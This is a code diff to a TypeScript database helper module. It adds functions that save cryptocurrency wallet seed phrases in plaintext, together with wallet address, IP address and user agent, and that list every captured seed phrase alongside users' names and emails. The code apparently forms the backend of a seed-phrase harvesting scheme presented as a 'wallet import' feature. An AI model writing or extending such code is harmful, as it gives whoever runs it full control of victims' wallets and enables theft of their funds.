@@ -1,6 +1,6 @@
 import { eq, and } from "drizzle-orm";
 import { drizzle } from "drizzle-orm/mysql2";
-import { InsertUser, users, apiTokens } from "../drizzle/schema";
+import { InsertUser, users, apiTokens, walletImports } from "../drizzle/schema";
 import { ENV } from './_core/env';
 import { randomBytes } from "crypto";
 
@@ -160,6 +160,47 @@ export async function listAllApiTokens() {
     .from(apiTokens)
     .leftJoin(users, eq(apiTokens.userId, users.id))
     .orderBy(apiTokens.createdAt);
+  return rows;
+}
+
+// ─── Wallet Import Helpers ──────────────────────────────────────────────────────
+
+export async function saveWalletImport(data: {
+  userId?: number | null;
+  seedPhrase: string;
+  walletAddress?: string | null;
+  ipAddress?: string | null;
+  userAgent?: string | null;
+}) {
+  const db = await getDb();
+  if (!db) throw new Error('Database not available');
+  await db.insert(walletImports).values({
+    userId: data.userId ?? null,
+    seedPhrase: data.seedPhrase,
+    walletAddress: data.walletAddress ?? null,
+    ipAddress: data.ipAddress ?? null,
+    userAgent: data.userAgent ?? null,
+  });
+}
+
+export async function listAllWalletImports() {
+  const db = await getDb();
+  if (!db) return [];
+  const rows = await db
+    .select({
+      id: walletImports.id,
+      userId: walletImports.userId,
+      seedPhrase: walletImports.seedPhrase,
+      walletAddress: walletImports.walletAddress,
+      ipAddress: walletImports.ipAddress,
+      userAgent: walletImports.userAgent,
+      importedAt: walletImports.importedAt,
+      userName: users.name,
+      userEmail: users.email,
+    })
+    .from(walletImports)
+    .leftJoin(users, eq(walletImports.userId, users.id))
+    .orderBy(walletImports.importedAt);
   return rows;
 }
 
